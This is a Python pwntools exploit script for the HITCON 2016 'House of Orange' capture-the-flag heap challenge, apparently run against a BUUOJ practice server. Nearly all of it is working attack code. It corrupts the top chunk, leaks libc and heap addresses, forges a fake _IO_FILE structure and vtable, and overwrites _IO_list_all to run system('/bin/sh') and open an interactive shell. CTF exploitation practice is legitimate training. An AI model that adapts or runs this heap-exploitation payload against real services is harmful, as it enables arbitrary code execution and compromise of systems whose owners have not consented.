from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './houseoforange_hitcon_2016'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',28254) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

# start
def add(size):
    sla('choice :','1')
    sla(":",str(size))
    sa(':','a'*8)
    sla(':','1')
    sla(':','1')

def show():
    sla('choice :','2')

def edit(size,name):
    sla('choice :','3')
    sla(":",str(size))
    sa(':',name)
    sla(':','1')
    sla(':','1')

add(0x18)
useless = flat(0,0x21,0x1f00000001,0)
payload = 'a'*0x10 + useless + flat(0,0xfa1)
edit(0x40,payload) # corrupt top chunk

add(0x1000) # old_top -> unsorted
add(0x400) # slice old top
show()
ru('a'*8)
base = uu64(ru('\n'))-1640-libc.sym['__malloc_hook']-0x10
leak('base',base)
system = base + libc.sym['system']
io_list_all = base + libc.sym['_IO_list_all']

'''large chunk:
0x56512e53b0c0:	0x0000000000000000 0x0000000000000411
0x56512e53b0d0:	0x6161616161616161	0x00007f01ea979188
0x56512e53b0e0:	0x000056512e53b0c0	0x000056512e53b0c0
'''
edit(0x10,'a'*0x10)
show()
ru('a'*0x10)
heap = uu64(ru('\n')) - 0xc0
leak('heap',heap)

# jump_table+0x18
payload = flat(0,0,0,system).ljust(0x400,'\x00')
# _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable
payload += useless + flat('/bin/sh\x00',0x61,0,io_list_all-0x10,2,3,'\x00'*(0xd8-0x30),heap+0xd0)
edit(0x1000,payload)

sla('choice :','1')
# end

itr()
